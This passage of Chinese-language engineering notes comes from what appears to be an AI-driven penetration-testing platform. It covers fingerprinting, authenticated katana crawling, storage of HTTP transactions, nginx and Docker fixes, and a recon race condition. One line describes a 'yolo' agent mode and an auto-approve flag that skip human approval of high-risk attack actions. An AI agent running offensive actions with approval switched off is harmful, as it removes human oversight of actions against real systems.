cookies（`authenticated:<profile>`），无会话标记 `no_auth_context:<profile>`/`external_only` 仅外部探测并在结果提示；⑤ 落库四通道：**新增独立明细表 `recon_fingerprints`**（幂等键 task_id+target_url，存完整四层 JSON + favicon + auth_mode + rule_count）+ `recon_facts(category=technology)` + `recon_endpoints(tech_stack)` + `recon_techniques(name=fingerprint|{host})` 足迹防重；⑥ 实时流：`phase_changed(pre_recon)` + `tool_call_start/end(fingerprint)` 经 SSE 推送前端（前端 events.js 已支持渲染，无需改动）；⑦ 新增依赖 `mmh3>=4.1.0`。**约束**：① 落库场景 ReconStore 构造即建表、不得因文件不存在返回 None；② 匹配时 header value 保留原大小写，matcher 内统一 `.lower()`；③ `recon_fingerprints` 明细仅存本地库，跨任务复用靠 technology facts 走 PG 聚合层（fingerprint 表本身不同步 PG）；④ pre_recon 由 executor 主路径调用（deadend 与 ScanWorkflow 降级路径共用），失败仅记日志/审计，不阻断任务主流程；⑤ 后续新增指纹库规则须保持标准 schema（name/method/location/keywords/category/confidence）。

- **[CORS]** dev `allow_origins=["*"]` + `allow_credentials=True` 并存（源码现状），但 `AGENTS.md` 要求生产收敛为具体 origin，且禁止 `*` 与 credentials 同用。生产须改 `POBI_V2_CORS_ORIGINS`。
- **[Dockerfile.prod]** 强制多阶段构建（编译工具与运行时隔离）；`docker-compose.yml` 镜像强制阿里云 ACR 前缀，禁止官方裸镜像（如 `mongo:7.0`，应 `redis:7-alpine` 等 ACR 前缀）。
- **[前端形态（2026-08-31 落地，2026-09-01 调整部署；2026-09-01 依源码校正）]** 前端**已收敛为 React 单形态**，「双形态共存」不再成立：① ~~**零构建版** `web/index.html`+`web/static/`~~ **已从磁盘移除**——2026-09-01 核实 `web/` 目录下仅有构建产物 `spa/`，不存在可回退的零构建版本；② **React 版** `webapp/`（Vite 工程）经 `npm run build` 输出到 `web/spa/`，`base=/`（2026-09-01 由 `/app/` 改为根路径），由 nginx **根目录直接静态托管**（`web` 服务挂载 `./web/spa:/usr/share/nginx/html:ro`），`/` 即 React 控制台。`/app/` 作为**兼容别名**保留，反代到 FastAPI 的 `/app` 路由（仍托管 `web/spa`）。**约束**：① 零构建版已不存在，**无可回退版本**（如需恢复须从 git 历史取回 `web/index.html` + `web/static/`）；② React 改动只在 `webapp/`，`web/spa/` 是构建产物**禁止手工编辑**；③ 部署前必须 `cd webapp && npm run build`（产物进 `web/spa`）再 `docker compose up -d web`；④ nginx `web` 服务挂载点是 `./web/spa`；⑤ SSE 经 `/api/v1/tasks/{id}/stream`，在 nginx 独立 location 已 `proxy_buffering off`，实时性有保障。
- **[nginx 反向代理]** 当前架构保留 `web`（nginx）作为边界层，价值与取舍如下：
  - **保留理由**：① 强制 Gzip（uvicorn 默认不压缩，批量任务大 JSON 直推前端会明显变慢）；② SSE 长连接统一在反代层关闭代理缓冲（`proxy_buffering off` / `read_timeout 3600s`），`/api/v1/tasks/{id}/stream` 实时性更有保障；③ 统一 80 端口暴露，前端同源走 `/api` 前缀无需跨端口；④ 对外发布时可在此层加 HTTPS/限流而无需改应用代码。
  - **代价 / 风险**：开源版 nginx 对 `upstream` 内域名**只在启动时解析一次并永久缓存**；api 容器重启后 IP 漂移，nginx 仍连旧地址（撞到其它容器 8000 端口）会稳定 502。已用 `resolver 127.0.0.11 valid=10s ipv6=off` + 变量形式 `proxy_pass http://$api_upstream`（无尾斜杠，避免吞 URI）根治，见 `nginx.conf` / `nginx.dev.conf`。
  - **本地开发可行性**：单人本地开发可去掉 nginx，前端 API base 直连 `http://127.0.0.1:8000`，少一层故障面；仅在需要 Gzip / SSE 缓冲控制 / HTTPS / 公网暴露时再用 nginx。这是**可选优化**，非强制。
- **[agent_mode]** `hacker`（默认需审批）/ `yolo`（自动批准高危，授权靶场自动化）；`POBI_V2_AUTO_APPROVE=true` 时审批回调自动批准。
- **[probe 快路径]** `POST /system/probe` 仅 probe 自身绕过 avfs/多智能体（避免 dev 环境 avfs 未挂载卡死），正常任务仍走 M8 完整链路；硬超时 90s。
- **[Token 实时展示：Redis 实时真源 + SSE 增量推送（2026-08-28）]** 前端要求实时展示任务 token 用量。核心约束：token 累计在 **worker 进程内存**（`_session_usage_store`），而 SSE 推送 / `GET /tasks/{id}/usage` 在 **api 进程**，api 读不到 worker 内存，必须经共享存储跨进程。**方案**：① `_accumulate_session_usage` 内存累计（executor 落库用）+ **异步 HINCRBY 写 Redis**（`pobi:usage:{tid}` 三字段，TTL 24h 兜底，多 worker 副本可正确合并）；② `emit_llm_response` 事件 payload 附加 `token_usage` 累计值，随 SSE 推送，前端 `onEvent` 收到 `llm_response` 即增量刷新 `.console-tokens` 卡片（零轮询）；③ `GET /tasks/{id}/usage` 对 **running/queued 优先读 Redis**，终态/无实时数据回退 DB；④ token 卡片显示条件放宽为 `ut>0 || running/queued`（运行中即使 0 也显示，等首条 SSE 刷新）。**约束**：① 不要用统一层进程内累计器替代 Redis——跨进程、多 worker 合并必须靠 Redis，DB 落库保留（历史/汇总页）；② `reset_session_usage`（任务启动）必须**同时清内存与 Redis**，避免跨任务污染；③ 事件总线为 **memory 后端（开发模式）时 `get_realtime_usage` 自动回退内存**，不阻塞；④ **dev 模式热重载约定（docker-compose.override.yml 自动合并生效）**：api/worker 均**挂载宿主机源码**进容器（`./pobi_v2`、`./pobi_agent`、`./pobi_prompts`、`./alembic`），改代码**无需重建镜像**。api 用 `uvicorn --reload` **改码实时生效**；worker 用 `arq`（**故意不用 --watch**，曾致探针任务被 cancel/假活离线），改码后须**手动 `docker compose restart worker`**；web 挂载 `./web` + `nginx.dev.conf`（关静态缓存）即时生效。**禁止**在 dev 下 `docker compose build`（多余；生产用 `start-prod.sh`/`-f docker-compose.yml` 才需要 build）。
- **[nginx 静态 DNS 缓存 → 502（2026-08-31 修复）]** 登录 `/api/v1/auth/login` 稳定返回 `502 Bad Gateway`，nginx 报 `connect() failed (111: Connection refused) upstream: http://172.18.0.5:8000`。根因：`upstream { server api:8000; }` 写法下开源版 nginx 仅在启动时解析一次 DNS 并永久缓存；api 容器重启后 IP 从 `172.18.0.5` 漂到 `172.18.0.6`，而 `.5` 已被 worker 容器占用（worker 不监听 8000），nginx 仍连旧地址 → 撞 worker 的 8000 被拒。**诊断要点**：① 服务本身健康（api 容器内 `Uvicorn running on 0.0.0.0:8000` + `Application startup complete`，且 `docker exec web curl api:8000` 能回 404）；② `docker network inspect pobi_net` 比对 nginx 报错里的 upstream IP 与 api 当前 IP，不一致即此问题。**修复**：`nginx.conf` / `nginx.dev.conf` 的 `upstream` 块改为 `resolver 127.0.0.11 valid=10s ipv6=off` + 变量型 `set $api_upstream "api:8000"; proxy_pass http://$api_upstream;`（变量形式才走 resolver 动态解析，且**不能带尾斜杠**否则吞掉原始 URI），然后 `docker compose up -d --force-recreate web` 生效。**约束**：此后若要加新反代 location，一律复用 `$api_upstream` 变量，勿再新建 `upstream { server ... }` 块（否则重蹈静态缓存覆辙）。
- **[sitemap 集成 katana（2026-09-02 落地）]** 前置侦查第二子阶段：Kali 内执行 katana 构建站点地图，请求/响应格式化落 `recon_http_transactions`（source 区分 `sitemap:katana`/`agent:requester`），为站点地图页面打数据基座。**用户决策点（5 个）**：① **自建 Kali 镜像自装 katana 打包发布**——代码侧只做 `katana -version` 健康检查，缺失 → `status="skipped"` 不阻断任务（`katana_available` 降级语义）；② 三层防线方案（katana 参数去噪 + 落库 `utils.urls` 过滤 + agent 复用注入 L1/covered_block）；③ **请求即格式化储存**（故不用 katana `-ob` 省略 body，保留 response body 落库）；④ **复用认证 cookie**——pre_recon 读取 `preauth` 会话注入 katana `-H 'Cookie: ...'`，端点需认证先做前置认证；⑤ 爬取参数按 katana 默认（`-d 3 -fs rdn -c 10 -rl 150`）。**补充约束**：**katana 不暴露给 agent 工具集**（仅前置侦查平台层调用，对齐 fingerprint 不暴露模式）；katana 官方 README **无 `-pcs`（内容相似度）/`-fsu`（相似 URL）/`-filter-page-type`** 参数，方案初稿误信了这些 flag，已修正为仅用 `-ef`/`-iqp`（见历史踩坑），内容相似/相似 URL 过滤由落库层承担；`-fx`（表单提取）输出结构未核验前不作为默认参数，留作 `extra_args` 可配置。**落库**：transactions 流水（无幂等键，保留每次请求历史）+ `recon_endpoints`（幂等 `task_id+path_normalized`，sitemap 置信度 0.6，`discovered_via=sitemap:katana`，requester 实测可覆盖）+ 足迹 `recon_techniques(sitemap|{host})` 防重（同 host 只跑一次）。**约束**：① katana 原始 JSONL 落盘 `tasks/<id>/sitemap/katana_raw.jsonl` 防误过滤复盘，禁止仅依赖内存解析；② sitemap 失败/skipped 仅降级不阻断任务主流程；③ 命令构造必须 shlex 引用（target/Cookie 防注入）；④ 大响应体走**分层存储**（见「响应体分层存储」条目，不再 blob 外置）；⑤ requester 事务写入必须旁路 no-op（context 未注入安全跳过，异常仅 debug 不阻断请求主流程，保持既有容错语义）。
- **[响应体分层存储 + 目标级增量更新（2026-09-02 落地）]** sitemap 数据基座按「骨架必存 + 响应体分层 + 跨任务增量」改造。**用户决策点（3 个）**：① 分层存储细节按推荐（gzip 存 SQLite BLOB 列，随库自包含，不引入外置文件）；② 结构化摘要**不识别关键字段（不调 LLM）**，取响应前 2048 字符（`_DIGEST_PREFIX_BYTES` 常量可配；response_title 正则提取不算 LLM）；③ 增量更新依赖 pgsql——本地 sqlite 只存当前任务数据，新建任务从 pgsql 拉取目标历史骨架，完成任务推送到 pgsql 做 target 级关联。**分层规则（store.py）**：<100KB → `full` 明文全量落库；100KB–1MB（非 API）→ `compressed` gzip 存 `body_compressed` BLOB（DB 存 200 字符预览）；>1MB（非 API）→ `digest` 仅存前 2048 字符摘要（**不写外置全量**）；**json/xml API 响应例外——即使大也全量（≥100KB 走 compressed 压缩保留）**，判定 `_API_CONTENT_TYPE_RE` 命中 content-type。旧库 `_ensure_column` 幂等补 `storage_strategy`/`body_compressed`/`pg_synced_at` 列。**读取侧按需拉取**：`list_http_transactions` 默认只回骨架（不拖大 body），`get_transaction_body(task_id, tx_id)` 解压/取全文。**PG 目标级关联（M8）**：新增聚合表 `recon_http_transactions_agg`（alembic `0020_recon_http_tx_agg`，唯一键 `target_id+tenant_id+method+url`，行收敛只留最新，含分层 body）；`upsert_to_pg` 扩展读本地脏事务（pg_synced_at IS NULL）→ PG upsert → **提交成功后打标**；`seed_from_pg` 扩展拉目标事务骨架灌本地端点树（covered_block / L1 增量提示）。**约束**：① 本地事务表是**流水**（保留每次请求历史，无幂等键，`source` 区分来源），PG agg 是**目标级收敛**（url 维度只留最新）——两表语义不同，站点地图页本地按 task 看流水、跨任务视图按 target 查 PG agg；② 打标必须在 PG 提交成功后执行（失败不打标，靠脏标记重试）；③ 摘要/压缩常量集中 store.py 顶部可配，禁止散落魔数；④ json/xml 例外是**硬约束**（API 响应全量保留，即使 >1MB），只对非 API 走 digest 摘要。
- **[katana 参数误传踩坑（2026-09-02 记录）]** 方案初稿与 M2 首版 `KATANA_EXTRA_ARGS` 含 `-filter-page-type error,captcha`、`-fsu`（相似 URL）、`-pcs`（内容相似度）——完整读 katana README 后确认**这三个 flag 均不存在**（FILTER 部分仅 `-em/-ef/-mr/-fr/-fdc/-mdc`），katana 会报 "unknown flag" 直接失败。已修正：仅保留确认存在的 `-ef`（扩展名过滤）、`-iqp`（忽略 query 变体）；`engine.py`/`katana_runner.py` docstring 同步去掉错误参数名。**教训/约束**：① 集成外部工具前必须完整读官方 README/`-h` 核验参数存在性，禁止凭记忆或二手资料写 flag；② 落库层 `should_keep` 承担相似 URL/内容噪音过滤（`is_noise_path`/`has_noise_params`），不依赖工具侧不存在的参数。
- **[pre_recon 时序竞态 + executor log 未定义（2026-09-02 修复）]** 前置侦查两个运行问题（由任务 `71fb302c` 暴露）：① **executor.py `_run_pre_recon_branch` 引用未定义 `log`**——`log = task_logger(tid)` 是 `run_task`/`_run_task_body` 的**局部变量**，`_run_pre_recon_branch` 是独立 async 函数、作用域内无 `log`，pre_recon 一完成打日志即抛 `NameError: name 'log' is not defined` → 任务必 failed、主 agent 从未启动（PG `tasks.error` 实锤该字符串）。② **时序竞态**——worker 侧 pre_recon 与 api 侧后台 preauth 认证并行，pre_recon 抢跑在认证落盘前读取会话 → `auth_mode=no_auth_context:preauth` → katana 匿名爬取只抓登录页（`auth_used=0`）。**修复**：① `_run_pre_recon_branch` 函数内补 `log = task_logger(tid)`；② `pre_recon.run_pre_recon` 新增 `preauth_wait_timeout` 参数（**默认 0 = 不等待**，向后兼容测试/无认证场景），新增 `_wait_for_auth_context`（轮询 `AuthContextHandler.load_context` 直到 `authenticated:*` 或超时降级，间隔 1s）；executor 在任务带认证（`task.auth_username` 非空）时传 `PREAUTH_WAIT_TIMEOUT(60s)`，无认证任务传 0 不白等。测试 `tests/recon/test_pre_recon.py` 新增 3 项（轮询至就绪/超时降级/run_pre_recon 小超时优雅降级），33 passed。**约束**：① 任务级日志统一用 `task_logger(tid)` 并**在函数体内显式定义**，禁止引用父作用域局部 `log`（`tasks.py`/`executor.py` 同规则）；② pre_recon 等待认证必须带超时兜底且失败仅降级、不阻断侦查主流程；③ 仅任务带认证时启用等待，无认证任务不得引入额外延迟；④ `preauth_wait_timeout` 默认 0 保持向后兼容，等待只由 executor 按需开启。


